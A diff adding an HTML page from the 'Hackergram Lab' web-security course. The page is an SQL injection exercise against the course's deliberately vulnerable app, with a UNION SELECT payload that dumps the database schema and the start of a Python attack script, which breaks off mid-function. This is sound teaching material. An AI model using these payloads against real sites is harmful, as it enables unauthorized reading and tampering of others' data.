@@ -1,0 +1,2195 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://netexperiments.github.io/websecurity/labs/attacks/sqli/">
+      
+      
+        <link rel="prev" href="../lab-setup/">
+      
+      
+        <link rel="next" href="../nosqli/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/favicon.jpg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>SQL Injection - Hackergram Lab</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql-injection" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Hackergram Lab" class="md-header__button md-logo" aria-label="Hackergram Lab" data-md-component="logo">
+      
+  <img src="../../../assets/favicon.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Hackergram Lab
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../hackergram/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Hackergram Overview
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../lab-setup/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Laboratory Setup
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Web Security Experiments
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Hackergram Lab" class="md-nav__button md-logo" aria-label="Hackergram Lab" data-md-component="logo">
+      
+  <img src="../../../assets/favicon.jpg" alt="logo">
+
+    </a>
+    Hackergram Lab
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hackergram/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hackergram Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Laboratory Setup
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Laboratory Setup
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab-setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab Setup
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security Experiments
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security Experiments
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security Attacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Parser-Driven Injections
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Parser-Driven Injections
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#error-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Error-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Union-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#piggybacked-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Piggybacked SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#boolean-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boolean-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#changing-other-users-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Changing other user's profile
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#countermeasures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Countermeasures
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Countermeasures">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-requests-reach-the-database-viewspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How requests reach the database (views.py)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-login-stops-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix login (stops authentication bypass)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-get_posts-stops-search-union-inference-tricks-on-posts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix get_posts (stops search / UNION / inference tricks on /posts)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-update_user_settings-stops-piggybacked-update-in-profile-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix update_user_settings (stops piggybacked UPDATE in profile fields)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-admin-delete-user-viewspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix admin delete user (views.py)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#still-use-least-privilege-and-safer-errors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Still use least privilege and safer errors
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nosqli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Interpreter-Driven Injections
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Interpreter-Driven Injections
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross-Site Scripting (XSS)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../llm-mediated-sqli/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM-mediated SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../llm-mediated-stored-xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM-mediated Stored XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../indirect-prompt-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Indirect Prompt Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../system-prompt-leakage/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    System Prompt Leakage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_3" id="__nav_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access & Resource Control
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Access & Resource Control
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../path-traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Request & Interaction Forgery
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Request & Interaction Forgery
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross-Site Request Forgery (CSRF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-Side Request Forgery (SSRF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#error-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Error-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Authentication bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Union-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#piggybacked-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Piggybacked SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#boolean-based-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Boolean-based SQLi
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#changing-other-users-profile" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Changing other user's profile
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#countermeasures" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Countermeasures
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Countermeasures">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-requests-reach-the-database-viewspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How requests reach the database (views.py)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-login-stops-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix login (stops authentication bypass)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-get_posts-stops-search-union-inference-tricks-on-posts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix get_posts (stops search / UNION / inference tricks on /posts)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-update_user_settings-stops-piggybacked-update-in-profile-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix update_user_settings (stops piggybacked UPDATE in profile fields)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fix-admin-delete-user-viewspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fix admin delete user (views.py)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#still-use-least-privilege-and-safer-errors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Still use least privilege and safer errors
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="sql-injection">SQL Injection</h1>
+<p>SQL injection is a type of attack in which an attacker injects malicious SQL queries into the input fields of a web application, targeting the SQL database. In case of success, the attacker can perform unauthorized actions, such as accessing sensitive information stored in the database, altering data by inserting, updating, or deleting records, and executing administrative commands, such as shutting down the database management system (DBMS). In more advanced scenarios, SQL injection may allow attackers to retrieve files stored on the DBMS file system or even execute system-level commands. </p>
+<p>Hackergram is vulnerable to several types of SQLi attacks. The following exercises address these vulnerabilities. Some attacks are performed using the victim-browser and others are performed through Python scripts run at the attacker.</p>
+<h2 id="error-based-sqli">Error-based SQLi</h2>
+<p>Start by obtaining information on the database software and schema. First, inject an apostrophe (') in the search field of the /users or /posts endpoints. An error message will be displayed disclosing that the software is MySQL. Next, to obtain the database schema, inject the following instruction in the search filed of the /posts endpoint (it uses union-based injection):</p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT &#39;1&#39;, TABLE_NAME, &#39;1&#39;, &#39;1&#39;, COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- 
+</code></pre></div>
+<p>You will learn that the database has four tables (Users, Requests, Posts, and Friends), and you will also learn which are the columns of each table. To obtain a more structured output run the script of Appendix A at the attacker.</p>
+<details>
+<summary><strong>💡 Solution</strong></summary>
+Execute this script on the attacker's machine:
+<div class="highlight"><pre><span></span><code><span class="c1"># Gets DB version and DB schema (Search Posts)</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/reset&quot;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">register</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s2">&quot;Mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/signup&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s2">&quot;mallory&quot;</span><span class="p">,</span>
+        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s2">&quot;eve123&quot;</span>
+    <span class="p">}</span>
+    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/login&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;search&#39;</span> <span class="p">:</span> <span class="s2">&quot;&#39; UNION SELECT -- &quot;</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">SERVER</span><span class="o">+</span><span class="s2">&quot;/posts&quot;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
